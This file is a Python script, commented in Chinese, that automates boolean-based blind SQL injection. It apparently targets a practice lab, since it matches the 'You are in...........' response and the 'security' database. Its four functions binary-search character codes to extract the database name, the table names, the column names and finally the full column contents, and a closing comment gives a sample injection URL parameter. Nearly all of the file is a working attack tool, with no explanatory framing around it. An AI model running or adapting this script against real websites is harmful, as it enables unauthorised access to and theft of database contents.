import requests
session = requests.Session()

# 盲注模块

def db(url):
    name = ''
    for i in range(1,50):
        begin = 32
        end = 128
        # 一个算法，二分查找
        tmp = (begin + end) // 2
        while begin < end:
            paramsPost = "and/**/ascii(substr(database(),{0},1))>{1}-- -" .format(i,tmp)
            # 发送get请求
            response = session.get(url+paramsPost)
            # 如果返回的内容有You are in...........
            if 'You are in...........' in response.text:
                begin = tmp + 1
                tmp = (begin + end) // 2
            else:
                end = tmp
                tmp = (begin + end) // 2
        if(tmp==32):
            break;
            # 查找到的内容追加到name字符串后面
        name += chr(tmp)
        print(name)

# 下同
def table(url,database):
    name = ''
    for i in range(1,50):
        begin = 32
        end = 128
        tmp = (begin + end) // 2
        while begin < end:
            paramsPost = "and/**/ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='{0}'),{1},1))>{2}-- -" .format(database,i,tmp)

            response = session.get(url+paramsPost)
            if 'You are in...........' in response.text:
                begin = tmp + 1
                tmp = (begin + end) // 2
            else:
                end = tmp
                tmp = (begin + end) // 2
        if(tmp==32):
            break;
        name += chr(tmp)
        print(name)
def columns(url,database,table_name):
    name = ''
    for i in range(1,50):
        begin = 32
        end = 128
        tmp = (begin + end) // 2
        while begin < end:
            paramsPost = "and/**/ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}'),{2},1))>{3}-- -" .format(database,table_name,i,tmp)
            response = session.get(url+paramsPost)
            if 'You are in...........' in response.text:
                begin = tmp + 1
                tmp = (begin + end) // 2
            else:
                end = tmp
                tmp = (begin + end) // 2
        if(tmp==32):
            break;
        name += chr(tmp)
        print(name)


def nr(url,database,table_name,a):
    name = ''
    for i in range(1,1000):
        begin = 32
        end = 128
        tmp = (begin + end) // 2
        while begin < end:
            paramsPost = "and/**/ascii(substr((select group_concat({0}) from {1}.{2}),{3},1))>{4}-- -" .format(a,database,table_name,i,tmp)
            response = session.get(url+paramsPost)
            if 'You are in...........' in response.text:
                begin = tmp + 1
                tmp = (begin + end) // 2
            else:
                end = tmp
                tmp = (begin + end) // 2
        if(tmp==32):
            break;
        name += chr(tmp)
        print(name)



# ?id=1'and ascii(substring((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))>0--+

